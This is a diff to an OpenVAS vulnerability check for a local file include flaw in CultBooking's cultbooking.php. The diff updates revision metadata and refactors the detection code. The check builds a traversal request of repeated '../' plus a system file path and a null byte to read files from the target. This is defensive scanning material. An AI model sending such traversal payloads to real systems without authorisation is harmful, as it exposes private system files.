@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_CultBooking_45965.nasl 5642 2017-03-21 08:49:30Z cfi $
+# $Id: gb_CultBooking_45965.nasl 5717 2017-03-24 13:02:24Z cfi $
 #
 # CultBooking 'cultbooking.php' Local File Include and Multiple Cross Site Scripting Vulnerabilities
 #
@@ -40,26 +40,21 @@ based authentication credentials and launch other attacks.
 
 CultBooking 2.0.4 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103042);
- script_version("$Revision: 5642 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5717 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 14:02:24 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-01-25 13:20:03 +0100 (Tue, 25 Jan 2011)");
  script_bugtraq_id(45965);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
  script_name("CultBooking 'cultbooking.php' Local File Include and Multiple Cross Site Scripting Vulnerabilities");
-
  script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45965");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4987.php");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4988.php");
  script_xref(name : "URL" , value : "http://www.cultuzz.com/cultbooking");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if CultBooking is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -71,31 +66,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+include("host_details.inc");
+
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
 files = traversal_files();
 
-dirs = make_list("/cb","/cultbooking","/CultBooking",cgi_dirs());
+foreach dir( make_list_unique( "/cb", "/cultbooking", "/CultBooking", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir,"/cultbooking.php?lang=",crap(data:"../",length:3*9),files[file],"%00"); 
+  if( dir == "/" ) dir = "";
 
+  foreach file( keys( files ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+    url = dir + "/cultbooking.php?lang=" + crap( data:"../", length:3 * 9 ) + files[file] + "%00";
 
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
